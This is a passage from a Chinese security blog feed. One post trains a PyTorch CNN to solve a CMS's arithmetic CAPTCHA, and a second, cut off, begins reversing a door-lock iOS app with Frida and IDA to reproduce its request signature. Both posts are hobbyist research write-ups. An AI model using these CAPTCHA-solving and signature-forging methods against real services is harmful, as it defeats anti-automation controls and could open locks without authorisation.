class="line">3÷1&#x3D;？_d0ad2c5c50b4d8db2736093bdf2c08e8.jpg</span><br><span class="line">6÷3&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">3×8&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">9-3&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">2-0&#x3D;？_d0a992ce88acf8a918f12646bef3a60d.jpg</span><br><span class="line">0+9&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">4-1&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">6+2&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">7×2&#x3D;？_3479d65864cdbbed02d5e9acb8e5fa37.jpg</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后就是验证码图片的保存。</p><p>主要代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BufferedImage bi = DefaultKaptcha.createImage(capStr);</span><br><span class="line">String fileName = dir.getPath()+File.separator+capStr.replace(<span class="string">"/"</span>,<span class="string">"÷"</span>).replace(<span class="string">"*"</span>,<span class="string">"×"</span>).replace(<span class="string">"?"</span>,<span class="string">"？"</span>) + <span class="string">"_"</span> + DigestUtils.md5Hex(<span class="string">""</span>+System.currentTimeMillis())+<span class="string">".jpg"</span>;</span><br><span class="line">ImageIO.write(bi, <span class="string">"jpg"</span>, <span class="keyword">new</span> File(fileName));</span><br></pre></td></tr></table></figure><p>生成的验证码如下：</p><p><img src="2%C3%B71=%EF%BC%9F_c893df08dbb80e70e26b7e352af0d4a4.jpg" alt="2/1=?"></p><p><img src="3%C3%975=%EF%BC%9F_44385059acbc138515e324c8e08af20c.jpg" alt="3*5=?"></p><p>到此获取标注好的验证码已经完成了，下面就开始进行验证码的识别。</p><h2 id="0x02-验证码的识别"><a href="#0x02-验证码的识别" class="headerlink" title="0x02  验证码的识别"></a>0x02  验证码的识别</h2><h3 id="1-分割识别"><a href="#1-分割识别" class="headerlink" title="1.分割识别"></a>1.分割识别</h3><p>最早是根据文章《<a href="https://guanqr.com/tech/computer/shangxueba-crack/" target="_blank" rel="noopener">自动识别验证码破解上学吧题目答案</a>》中的方法来进行验证码的识别，但是由于验证码不太规则，导致识别效果较差，后面就放弃了。这里列出简要过程。</p><p>验证码图片为 60×160 像素的，两个数字的范围都是 0 到 9。对图片转成灰度图后并进行分割。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">image &#x3D; Image.open(path).convert(&quot;L&quot;)</span><br><span class="line">cropped_image1 &#x3D; image.crop((25, 13, 50, 44))  # 第一个数字的切图</span><br><span class="line">cropped_image2 &#x3D; image.crop((65, 13, 90, 44))  # 第二个数字的切图</span><br></pre></td></tr></table></figure><blockquote><p>可以自己找比较合适的分割位置。</p></blockquote><p>分割的效果：</p><p><img src="image_corp.png" alt="分割"></p><p>然后进行二值化，遍历灰度图的像素点，这里以阈值66为界限，使得图片的像素点要么为纯黑 0，要么为纯白 255，下图是二值化之后的图片：</p><p><img src="binarizing.png" alt="二值化"></p><p>接着对验证码样本进行批量切图、转灰度图、二值化：</p><p>批量对图片进行分割，然后保存格式为<code>数字_md5(时间戳).jpg</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">corpImg</span><span class="params">(name)</span>:</span></span><br><span class="line">    imgPath = <span class="string">"MathCodes/"</span> + name</span><br><span class="line">    fname = name[<span class="number">0</span>:<span class="number">1</span>]</span><br><span class="line">    img = cv2.imread(imgPath, <span class="number">0</span>)  <span class="comment"># 直接读为灰度图像</span></span><br><span class="line">    img1 = img[<span class="number">13</span>:<span class="number">44</span>, <span class="number">28</span>:<span class="number">52</span>] <span class="comment">#分割</span></span><br><span class="line">    cv2.imwrite(fname+<span class="string">"_"</span>+getMd5()+<span class="string">".jpg"</span>, img1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    names = os.listdir(<span class="string">"MathCodes"</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        corpImg(name)</span><br></pre></td></tr></table></figure><p><img src="corpImages.png" alt="切图"></p><p>从中挑选出噪点去除效果最好图片的作为模板，0 到 9 这 10 个数字各一个。</p><p><img src="templets.png" alt="模板"></p><p>分别遍历这几个模板图片的像素点并存为 0-1 矩阵：首先创建一个 24列 31 行的二维数组（所有元素都为 0），遇到黑色像素点就将 0 变成 1，此处需要注意二维数组中坐标与像素点坐标是相反的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num_info = [([<span class="number">0</span>] * <span class="number">24</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>)]  <span class="comment"># 创建一个宽度为24，高度为31的二维数组</span></span><br><span class="line">pixdata = img.load()</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">        <span class="keyword">if</span> pixdata[x, y] == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># print(x, y)</span></span><br><span class="line">            num_info[y][x] = <span class="number">1</span>  <span class="comment"># 注意二维数组中坐标是相反的</span></span><br><span class="line">num_info_list.append(num_info)</span><br></pre></td></tr></table></figure><p>接下来就是识别了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">num_info_list = []  <span class="comment"># 这个数组用以存储全部数字的 0-1 矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    filename = <span class="string">'temp/'</span>+str(i) + <span class="string">'.png'</span></span><br><span class="line">    img = Image.open(filename)</span><br><span class="line"></span><br><span class="line">    num_info = [([<span class="number">0</span>] * <span class="number">24</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">31</span>)]  <span class="comment"># 创建一个宽度为24，高度为31的二维数组</span></span><br><span class="line">    pixdata = img.load()</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x, y] == <span class="number">0</span>:</span><br><span class="line">                <span class="comment"># print(x, y)</span></span><br><span class="line">                num_info[y][x] = <span class="number">1</span>  <span class="comment"># 注意二维数组中坐标是相反的</span></span><br><span class="line">    num_info_list.append(num_info)</span><br><span class="line">img = Image.open(<span class="string">'temp/067_1.jpg'</span>)</span><br><span class="line">img = binarizing(img,<span class="number">66</span>)</span><br><span class="line">img.save(<span class="string">"temp/01111.png"</span>)</span><br><span class="line">count_list = [] <span class="comment"># 记录当前图片像素信息与每一个 0-1 序列的匹配程度</span></span><br><span class="line"></span><br><span class="line">pixdata = img.load()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">31</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">            <span class="keyword">if</span> pixdata[x, y] == <span class="number">0</span> <span class="keyword">and</span> num_info_list[i][y][x] == <span class="number">1</span>: <span class="comment"># 图片中黑色像素点出现的位置对应的矩阵点也是 1</span></span><br><span class="line">                count = count + <span class="number">1</span></span><br><span class="line">    count_list.append(count)</span><br><span class="line"></span><br><span class="line">print(count_list)</span><br><span class="line">print(<span class="string">'当前图片的识别结果：'</span> + str(count_list.index(max(count_list)))) <span class="comment"># 找到匹配数最大的那个元素的序号，而序号和数字是相同的。</span></span><br></pre></td></tr></table></figure><p><img src="corp_recogn_result.png" alt="分割识别"></p><p>从上面来看识别效果不是太好，所以后面就放弃了这种方法。</p><blockquote><p>也可以先分割验证码，之后用ddddocr进行识别，中间的运算符可以采用上述的方法进行识别。这里就说一个思路，不具体实现了。一来比较麻烦，二来是运算符处理的效果也不会太好，但最终的结果会比直接分割识别这种方法好。</p></blockquote><p>这是ddddocr识别效果，有一个没识别出来，不过准确率还挺高。</p><p><img src="ddddocr_recogn_result.png" alt="ddddocr识别"></p><p>接下来就使用pytorch进行训练。</p><h3 id="2-pytorch识别"><a href="#2-pytorch识别" class="headerlink" title="2.pytorch识别"></a>2.pytorch识别</h3><p>pytorch训练验证码的过程都差不多，这里从网上找了一套修改了一下。</p><p>样本已经有了，首先对验证码进行分析。验证码字符一共有16种，分别为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0123456789+-×÷&#x3D;？</span><br></pre></td></tr></table></figure><p>验证码长度为5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">captcha_array &#x3D; list(&quot;0123456789+-×÷&#x3D;？&quot;)</span><br><span class="line">captcha_size &#x3D; 5</span><br></pre></td></tr></table></figure><p>接下来就是Datasets数据加载。</p><p>pytorch有非常方便高效的数据加载模块<code>Dataset</code>和<code>DataLoader</code>。<br>Dataset是数据样本的封装，可以很方便的读取数据。</p><p>实现一个Dataset的子类，需要重写<code>__len__</code>和<code>__getitem__</code>方法，<code>__len__</code>需要返回整个数据集的大小，<code>__getitem__</code>提供一个整数索引参数，返回一个样本数据（一个图片张量和一个标签张量）。主要代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyDataset</span><span class="params">(Dataset)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, root_dir)</span>:</span></span><br><span class="line">        super(MyDataset, self).__init__()</span><br><span class="line">        self.image_path = [os.path.join(root_dir, image_name) <span class="keyword">for</span> image_name <span class="keyword">in</span> os.listdir(root_dir)]</span><br><span class="line">        self.transforms = transforms.Compose(</span><br><span class="line">            [</span><br><span class="line">                transforms.ToTensor(),</span><br><span class="line">                transforms.Resize((<span class="number">60</span>, <span class="number">160</span>)),</span><br><span class="line">                transforms.Grayscale()  <span class="comment"># 灰色</span></span><br><span class="line">            ]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.image_path.__len__()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        image_path = self.image_path[index]</span><br><span class="line">        <span class="comment"># print(image_path)</span></span><br><span class="line">        image = self.transforms(Image.open(image_path))</span><br><span class="line">        ll = image_path.split(<span class="string">"/"</span>)[<span class="number">-1</span>]</span><br><span class="line">        ll = ll.split(<span class="string">"_"</span>)[<span class="number">0</span>] <span class="comment">#验证码文本</span></span><br><span class="line">        label_tensor = one_hot.text2Vec(ll)  <span class="comment"># [5,16]</span></span><br><span class="line">        label_tensor = label_tensor.view(<span class="number">1</span>, <span class="number">-1</span>)[<span class="number">0</span>]  <span class="comment"># [5*16]</span></span><br><span class="line">        <span class="comment"># print(label)</span></span><br><span class="line">        <span class="keyword">return</span> image, label_tensor</span><br></pre></td></tr></table></figure><p>其中<code>text2Vec</code>是将验证码进行onehot编码，这里是变成一个5*16的数组。</p><p>主要代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text2Vec</span><span class="params">(text)</span>:</span></span><br><span class="line">    vec = torch.zeros(common.captcha_size, len(common.captcha_array))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(text)):</span><br><span class="line">        vec[i, common.captcha_array.index(text[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> vec</span><br></pre></td></tr></table></figure><p>比如说<code>0×4=？</code>转换的结果就如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tensor([[1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], # 0</span><br><span class="line">        [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1., 0., 0., 0.], # ×</span><br><span class="line">        [0., 0., 0., 0., 1., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0.], # 4</span><br><span class="line">        [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1., 0.], # &#x3D;</span><br><span class="line">        [0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 0., 1.]]) # ？</span><br></pre></td></tr></table></figure><p>对应的还原方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vec2Text</span><span class="params">(vec)</span>:</span></span><br><span class="line">    vec = torch.argmax(vec, dim=<span class="number">1</span>)  <span class="comment"># 取最大值，不是0的取出来</span></span><br><span class="line">    text = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> vec:</span><br><span class="line">        text += common.captcha_array[i]</span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure><p>DataLoader是Dataset的进一步封装，Dataset每次通过<code>__getitem__</code>方法取到的是一个样本，经过DataLoader封装为dataloader后，每次取的是一个batch大小的样本批次。</p><p>主要代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform = transforms.Compose([transforms.ToTensor()])  <span class="comment"># 不做数据增强和标准化了</span></span><br><span class="line">train_dataset = CaptchaData(<span class="string">'./datasets/train/'</span>, transform=transform)</span><br><span class="line">train_data_loader = DataLoader(train_dataset, batch_size=<span class="number">32</span>, num_workers=<span class="number">0</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">test_data = CaptchaData(<span class="string">'./datasets/test/'</span>, transform=transform)</span><br><span class="line">test_data_loader = DataLoader(test_data, batch_size=<span class="number">128</span>, num_workers=<span class="number">0</span>, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p><code>transforms</code>是数据预处理操作，一般数据增强就通过transform实现，可以随机亮度，随机翻转，随机缩放等等。此处只使用了<code>ToTensor()</code>，将<code>PIL.Image</code>对象转换成Tensor。</p></blockquote><p>训练采用了CNN神经网络，CNN主要由卷积层，池化层，激活函数组成，再加上一个BatchNorm，BatchNorm叫做批规范化，可以加速模型的收敛速度。</p><p>模型的主要代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        <span class="comment"># 第一层神经网络</span></span><br><span class="line">        <span class="comment"># nn.Sequential: 将里面的模块依次加入到神经网络中</span></span><br><span class="line">        self.layer1 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>, <span class="number">16</span>, kernel_size=<span class="number">3</span>, padding=<span class="number">1</span>),  <span class="comment"># 3通道变成16通道，图片：60*160</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">16</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第2层神经网络</span></span><br><span class="line">        self.layer2 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">16</span>, <span class="number">64</span>, kernel_size=<span class="number">3</span>),  <span class="comment"># 16通道变成64通道，图片：30*80</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第3层神经网络</span></span><br><span class="line">        self.layer3 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>, <span class="number">128</span>, kernel_size=<span class="number">3</span>),  <span class="comment"># 64通道变成128通道，图片：14*39</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>)</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第4层神经网络</span></span><br><span class="line">        self.fc1 = nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">13824</span>, <span class="number">1024</span>),</span><br><span class="line">            nn.Dropout(<span class="number">0.2</span>),  <span class="comment"># drop 20% of the neuron</span></span><br><span class="line">            nn.ReLU()</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 第5层神经网络</span></span><br><span class="line">        self.fc2 = nn.Linear(<span class="number">1024</span>, common.captcha_size * common.captcha_array.__len__())  <span class="comment"># 5:验证码的长度， 16: 字母列表的长度</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 前向传播</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x = x.to(device)</span><br><span class="line">        x = self.layer1(x)</span><br><span class="line">        x = self.layer2(x)</span><br><span class="line">        x = self.layer3(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), <span class="number">-1</span>)</span><br><span class="line">        x = self.fc1(x)</span><br><span class="line">        x = self.fc2(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><p>nn.Sequential()可以看作模块的有序容器，可以方便快捷的搭建神经网络。<br>网络的输入是一个shape为<code>[batch, 3, 60, 180]</code>的张量，batch代表的是一个批次图片数量，3代表输入的图片是3通道的，即RGB，180和60则分别代表图片的宽和高。</p><p>经过上结构的卷积后，得到一个shape为<code>[batch, 128, 6, 18]</code>的张量，<code>x.view(x.size(0), -1)</code>将改变张量的shape为<code>[batch, 128*6*18]</code>，再用一个<code>[1024, 16*5]</code>的全连接层映射为一个<code>[batch, 16*5]</code>张量，这个就是模型的输出，其中<code>16</code>代表字符的种类数量，<code>5</code>代表一张验证码图片含有的字符数量。</p><p>接下来就是验证码的训练了：</p><p><img src="pytorch_train.png" alt="训练"></p><p>这里使用的是CPU进行训练的，训练样本生成了2000张，测试样本200张，刚开始训练准确率就可以到100%，而且速度不是太慢。</p><blockquote><p>验证码生成的脚本：<a href="https://github.com/fupinglee/Calculate_Captcha" target="_blank" rel="noopener">https://github.com/fupinglee/Calculate_Captcha</a></p><p>如果是在GPU下训练，在CPU下使用模型时，需要进行转换：</p><p><code>torch.load(model_path, map_location=torch.device(&#39;cpu&#39;))</code></p></blockquote><p>训练后测试的结果（200张测试准确率是100%，又另外生成了2000张验证码进行测试）：</p><p><img src="prtorch_test.png" alt="预测"></p><p>经过测试，使用pytorch训练的准确率可以达到99%。</p><p>完整代码：<a href="https://github.com/fupinglee/CalculateCaptcha_Recognition" target="_blank" rel="noopener">https://github.com/fupinglee/CalculateCaptcha_Recognition</a></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03  总结"></a>0x03  总结</h2><p>本文通过2种方法来对计算验证码进行识别。第一种方法使用简单，但识别率较低，可以针对一些比较简单的验证码（比如验证码未进行扭曲、干扰等）。第二种方法使用简单，但识别率比较依赖样本的数量，前期验证码标注是一件麻烦事，但对于本文这种简单的验证码，少量的样本准确率也会很高。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04  参考"></a>0x04  参考</h2><p>1.<a href="https://guanqr.com/tech/computer/shangxueba-crack/" target="_blank" rel="noopener">自动识别验证码破解上学吧题目答案</a></p><p>2.<a href="https://zhuanlan.zhihu.com/p/215700831" target="_blank" rel="noopener">pyTorch – 图形验证码识别</a></p><p>3.<a href="https://github.com/fupinglee/Calculate_Captcha" target="_blank" rel="noopener">验证码代码</a></p><p>4.<a href="https://github.com/fupinglee/CalculateCaptcha_Recognition" target="_blank" rel="noopener">pytorch识别验证码代码</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00  前言&quot;&gt;&lt;/a&gt;0x00  前言&lt;/h2&gt;&lt;p&gt;某CMS的验证码是简单的计算验证码，都是一位数的加减乘除运算，之前尝试用分割的方法识别，但成功率较低。后来采用了pytorch训练后进行识别，可以达到98%以上的识别率，于是整理一下过程，水一篇文章。&lt;/p&gt;
    
    </summary>
    
    
      <category term="验证码识别" scheme="https://fuping.site/categories/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
    
      <category term="验证码识别" scheme="https://fuping.site/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/"/>
    
      <category term="计算验证码" scheme="https://fuping.site/tags/%E8%AE%A1%E7%AE%97%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
      <category term="pytorch" scheme="https://fuping.site/tags/pytorch/"/>
    
      <category term="若依验证码" scheme="https://fuping.site/tags/%E8%8B%A5%E4%BE%9D%E9%AA%8C%E8%AF%81%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>当快捷指令遇上智能门锁</title>
    <link href="https://fuping.site/2021/02/04/IOS-ShortCut-And-Smart-Lock/"/>
    <id>https://fuping.site/2021/02/04/IOS-ShortCut-And-Smart-Lock/</id>
    <published>2021-02-04T11:32:07.000Z</published>
    <updated>2021-02-05T13:08:53.069Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>前段时间朋友小区换了一个智能门禁系统，户主通过一个APP进行管理，可以远程进行开锁操作。刚好这段时间在使用IOS的快捷指令操作，于是想做一个一键开门的快捷指令，直接通过快捷指令来完成开门的操作。</p><a id="more"></a><h3 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h3><p>首先打开APP进行抓包，发现参数中有一个加密的sign值。</p><p><img src="01.png" alt="抓包"></p><p>sign值与其他参数都有关系，修改其他参数会提示<code>签名验证失败</code>，而且时间久了该数据包不可用，提示<code>时间不正确，请调整时间</code>。</p><p>于是接下来对APP进行逆向，分析sign值是如何生成的。APP是从APPStore上下载的，首先第一步先进行砸壳。</p><p>数据线连接越狱的手机，打开app，执行<code>frida-ps -Ua</code>,查看Identifier</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Ua</span><br><span class="line"> PID  Name    Identifier</span><br><span class="line">----  ------  --------------------</span><br><span class="line">1823  xx生活  com.xx.xxlife</span><br><span class="line">1808  微信    com.tencent.xin</span><br><span class="line">1190  邮件    com.apple.mobilemail</span><br></pre></td></tr></table></figure><p>使用frida-ios-dump砸壳</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iproxy 2222 22</span><br><span class="line"><span class="built_in">cd</span> frida-ios-dump //在dump.py中配置好账号信息</span><br><span class="line">python3 dump.py com.xx.xxlife//砸壳</span><br></pre></td></tr></table></figure><p>解压得到的ipa文件，使用IDA打开Mac-O文件，在<code>Strings window</code>搜索<code>appUser/login</code></p><p><img src="02.png" alt="搜索字符串"></p><p>找到后查找引用</p><p><img src="03.png" alt="查找引用"></p><p>继续查找</p><p><img src="04.png" alt="继续查找引用"></p><p>发现在<code>+[LoginViewModel login:password:success:failure:]</code>方法中调用了。</p><p><img src="05.png" alt="login方法"></p><p>双击进入<code>-[RequestManager POST_URLString:parameters:showIndicatior:success:failure:]</code>方法，</p><p><img src="06.png" alt="POST_URLString方法"></p><p>在该方法中调用了<code>-[RequestManager RSAWithDic:]</code>方法，根据方法名可以猜出该方法是对参数进行了RSA加密。</p><p>打开<code>-[RequestManager RSAWithDic:]</code>方法</p><p><img src="07.png" alt="RSA加密方法"></p><p>发现参数sign是由其他参数进行RSA加密获得的。查看加密的参数格式的话可以通过<code>frida-trace</code>进行hook查看。</p><p>可以对<code>-[RequestManager convertToString:]</code>方法或者<code>+[RSAUtil encryptString:publicKey:]</code>方法进行hook。</p><p>查看<code>-[RequestManager convertToString:]</code>方法的参数与返回值，执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xx.xxlife -m <span class="string">"-[RequestManager convertToString:]"</span></span><br></pre></td></tr></table></figure><p><img src="08.png" alt="追踪convertToString方法"></p><p> Ctrl-C 停止运行，修改convertToString_.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    log(<span class="string">`-[RequestManager convertToString:<span class="subst">$&#123;args[<span class="number">2</span>]&#125;</span>]`</span>);</span><br><span class="line">    log(ObjC.Object(args[<span class="number">2</span>]));</span><br><span class="line">  &#125;,</span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    log(ObjC.Object(retval));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行，可以看到参数与返回值</p><p><img src="09.png" alt="重新追踪convertToString方法"></p><p>查看<code>+[RSAUtil encryptString:publicKey:]</code>方法的参数与返回值，执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 